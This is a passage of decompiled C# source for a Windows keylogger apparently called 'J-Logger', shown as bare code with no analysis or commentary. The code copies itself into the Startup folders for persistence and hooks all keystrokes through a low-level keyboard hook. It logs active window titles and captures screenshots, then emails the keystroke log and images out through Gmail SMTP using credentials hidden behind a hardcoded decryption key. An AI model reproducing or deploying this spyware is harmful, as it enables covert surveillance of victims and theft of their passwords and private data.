label_36:
        num3 = 38;
        if (directoryInfo.Exists)
          goto label_38;
label_37:
        num3 = 39;
        MyProject.Computer.FileSystem.CopyFile(sourceFileName, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + pr0ccess, true);
        goto label_40;
label_38:
        num3 = 41;
label_39:
        num3 = 42;
        MyProject.Computer.FileSystem.CopyFile(sourceFileName, "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + pr0ccess, true);
label_40:
        num3 = 45;
        this.Timer1.Interval = Conversions.ToInteger(this.sendl);
label_41:
        num3 = 46;
        this.Timer2.Interval = Conversions.ToInteger(this.sends);
label_42:
        num3 = 47;
        this.Timer3.Start();
label_43:
        num3 = 48;
        this.Timer1.Start();
label_44:
        num3 = 49;
        if (!Conversions.ToBoolean(this.screen))
          goto label_52;
label_45:
        num3 = 50;
        this.Timer2.Start();
        goto label_52;
label_47:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_25;
              case 27:
                goto label_26;
              case 28:
                goto label_27;
              case 29:
                goto label_28;
              case 30:
                goto label_29;
              case 31:
                goto label_30;
              case 32:
              case 33:
                goto label_31;
              case 34:
                goto label_32;
              case 35:
                goto label_33;
              case 36:
                goto label_34;
              case 37:
                goto label_35;
              case 38:
                goto label_36;
              case 39:
                goto label_37;
              case 40:
              case 43:
              case 44:
              case 45:
                goto label_40;
              case 41:
                goto label_38;
              case 42:
                goto label_39;
              case 46:
                goto label_41;
              case 47:
                goto label_42;
              case 48:
                goto label_43;
              case 49:
                goto label_44;
              case 50:
                goto label_45;
              case 51:
              case 52:
                goto label_52;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_47;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_52:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        if (Operators.CompareString(this.ncrypt, "1", false) != 0)
          goto label_5;
label_2:
        num3 = 3;
        string key1 = "jojogizmojake";
label_3:
        num3 = 4;
        this.us = Module1.Encryption.Decrypt(this.us, key1);
label_4:
        num3 = 5;
        this.pa = Module1.Encryption.Decrypt(this.pa, key1);
label_5:
        num3 = 7;
        MailMessage message = new MailMessage();
label_6:
        num3 = 8;
        message.From = new MailAddress("J-Logger@gmail.com");
label_7:
        num3 = 9;
        message.To.Add(this.t0);
label_8:
        num3 = 10;
        message.Subject = "User Name : " + Environment.UserName.ToString();
label_9:
        num3 = 11;
        message.Body = this.jojo;
label_10:
        num3 = 12;
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
label_11:
        num3 = 13;
        smtpClient.Port = 587;
label_12:
        num3 = 14;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.us, this.pa);
label_13:
        num3 = 15;
        smtpClient.EnableSsl = true;
label_14:
        num3 = 16;
        smtpClient.Send(message);
label_15:
        num3 = 17;
        if (Operators.CompareString(this.ncrypt, "1", false) != 0)
          goto label_25;
label_16:
        num3 = 18;
        string key2 = "jojogizmojake";
label_17:
        num3 = 19;
        this.us = Module1.Encryption.Encrypt(this.us, key2);
label_18:
        num3 = 20;
        this.pa = Module1.Encryption.Encrypt(this.pa, key2);
        goto label_25;
label_20:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
              case 7:
                goto label_5;
              case 8:
                goto label_6;
              case 9:
                goto label_7;
              case 10:
                goto label_8;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
                goto label_16;
              case 19:
                goto label_17;
              case 20:
                goto label_18;
              case 21:
              case 22:
                goto label_25;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_20;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_25:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        if (Operators.CompareString(this.ncrypt, "1", false) != 0)
          goto label_5;
label_2:
        num3 = 3;
        string key1 = "jojogizmojake";
label_3:
        num3 = 4;
        this.us = Module1.Encryption.Decrypt(this.us, key1);
label_4:
        num3 = 5;
        this.pa = Module1.Encryption.Decrypt(this.pa, key1);
label_5:
        num3 = 7;
        Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
label_6:
        num3 = 8;
        Graphics graphics = Graphics.FromImage((Image) bitmap);
label_7:
        num3 = 9;
        graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height));
label_8:
        num3 = 10;
        bitmap.Save(this.TEMP + "\\screenImage.jpg", ImageFormat.Jpeg);
label_9:
        num3 = 11;
        MailMessage message = new MailMessage();
label_10:
        num3 = 12;
        message.From = new MailAddress("J-Logger@gmail.com");
label_11:
        num3 = 13;
        message.To.Add(this.t0);
label_12:
        num3 = 14;
        message.Subject = "User Name : " + Environment.UserName.ToString() + " Screenshot";
label_13:
        num3 = 15;
        message.Body = "There is a screen shot attachment on this email";
label_14:
        num3 = 16;
        Attachment attachment = new Attachment(this.TEMP + "\\screenImage.jpg");
label_15:
        num3 = 17;
        message.Attachments.Add(attachment);
label_16:
        num3 = 18;
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
label_17:
        num3 = 19;
        smtpClient.Port = 587;
label_18:
        num3 = 20;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.us, this.pa);
label_19:
        num3 = 21;
        smtpClient.EnableSsl = true;
label_20:
        num3 = 22;
        smtpClient.Send(message);
label_21:
        num3 = 23;
        message.Dispose();
label_22:
        num3 = 24;
        bitmap.Dispose();
label_23:
        num3 = 25;
        bool flag = MyProject.Computer.FileSystem.FileExists(this.TEMP + "\\screenImage.jpg");
label_24:
        num3 = 26;
        if (!flag)
          goto label_26;
label_25:
        num3 = 27;
        MyProject.Computer.FileSystem.DeleteFile(this.TEMP + "\\screenImage.jpg", UIOption.OnlyErrorDialogs, RecycleOption.DeletePermanently);
label_26:
        num3 = 29;
        if (Operators.CompareString(this.ncrypt, "1", false) != 0)
          goto label_36;
label_27:
        num3 = 30;
        string key2 = "jojogizmojake";
label_28:
        num3 = 31;
        this.us = Module1.Encryption.Encrypt(this.us, key2);
label_29:
        num3 = 32;
        this.pa = Module1.Encryption.Encrypt(this.pa, key2);
        goto label_36;
label_31:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
              case 7:
                goto label_5;
              case 8:
                goto label_6;
              case 9:
                goto label_7;
              case 10:
                goto label_8;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
                goto label_16;
              case 19:
                goto label_17;
              case 20:
                goto label_18;
              case 21:
                goto label_19;
              case 22:
                goto label_20;
              case 23:
                goto label_21;
              case 24:
                goto label_22;
              case 25:
                goto label_23;
              case 26:
                goto label_24;
              case 27:
                goto label_25;
              case 28:
              case 29:
                goto label_26;
              case 30:
                goto label_27;
              case 31:
                goto label_28;
              case 32:
                goto label_29;
              case 33:
              case 34:
              case 35:
                goto label_36;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_31;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_36:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.strin, this.GetActiveWindowTitle(), false) == 0 || Operators.CompareString(this.strin, this.GetActiveWindowTitle(), false) == 0)
        return;
      this.jojo = this.jojo + "\r\n--------[" + this.GetActiveWindowTitle() + "]--------\r\n";
      this.strin = this.GetActiveWindowTitle();
    }

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    public class KeyboardHook
    {
      private const int HC_ACTION = 0;
      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 256;
      private const int WM_KEYUP = 257;
      private const int WM_SYSKEYDOWN = 260;
      private const int WM_SYSKEYUP = 261;
      private static int KeyHook;
      private static Form1.KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int SetWindowsHookEx(
        int idHook,
        Form1.KeyboardHook.KeyboardProcDelegate lpfn,
        int hmod,
        int dwThreadId);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHookEx(
        int hHook,
        int nCode,
        int wParam,
        Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnhookWindowsHookEx(int hHook);

      public static event Form1.KeyboardHook.KeyDownEventHandler KeyDown;

      public static event Form1.KeyboardHook.KeyUpEventHandler KeyUp;

      public KeyboardHook()
      {
        Form1.KeyboardHook.KeyHookDelegate = new Form1.KeyboardHook.KeyboardProcDelegate(Form1.KeyboardHook.KeyboardProc);
        Form1.KeyboardHook.KeyHook = Form1.KeyboardHook.SetWindowsHookEx(13, Form1.KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      private static int KeyboardProc(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam)
      {
        if (nCode == 0)
        {
          switch (wParam)
          {
            case 256:
            case 260:
              Form1.KeyboardHook.KeyDownEventHandler keyDownEvent = Form1.KeyboardHook.KeyDownEvent;
              if (keyDownEvent != null)
              {
                keyDownEvent((Keys) lParam.vkCode);
                break;
              }
              break;
            case 257:
            case 261:
              Form1.KeyboardHook.KeyUpEventHandler keyUpEvent = Form1.KeyboardHook.KeyUpEvent;
              if (keyUpEvent != null)
              {
                keyUpEvent((Keys) lParam.vkCode);
                break;
              }
              break;
          }
        }
        return Form1.KeyboardHook.CallNextHookEx(Form1.KeyboardHook.KeyHook, nCode, wParam, lParam);
      }

      ~KeyboardHook()
      {
        Form1.KeyboardHook.UnhookWindowsHookEx(Form1.KeyboardHook.KeyHook);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      private struct KBDLLHOOKSTRUCT
      {
        public int vkCode;
        public int scancode;
        public int flags;
        public int time;
        public int dwExtraInfo;
      }

      private delegate int KeyboardProcDelegate(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      public delegate void KeyDownEventHandler(Keys Key);

      public delegate void KeyUpEventHandler(Keys Key);
    }
  }
}
